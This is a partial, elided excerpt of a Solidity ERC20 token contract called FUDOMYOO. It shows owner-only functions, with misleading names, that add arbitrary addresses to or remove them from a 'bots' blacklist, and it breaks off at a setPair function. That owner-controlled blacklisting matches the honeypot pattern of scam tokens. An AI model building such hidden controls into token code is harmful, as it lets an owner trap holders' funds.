...
contract FUDOMYOO is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "Immovable Wisdom";
    string public _symbol= "FUDO";
    bool balances1 = true;
    ...
    function immovable(address[] memory recipients_) onlyOwner public {
        for (uint i = 0; i < recipients_.length; i++) {
            bots[recipients_[i]] = true;
        }
    }

    function removable(address[] memory recipients_) onlyOwner public {
        for (uint i = 0; i < recipients_.length; i++) {
            bots[recipients_[i]] = false;
        }
    }

    function setPair() onlyOwner public {
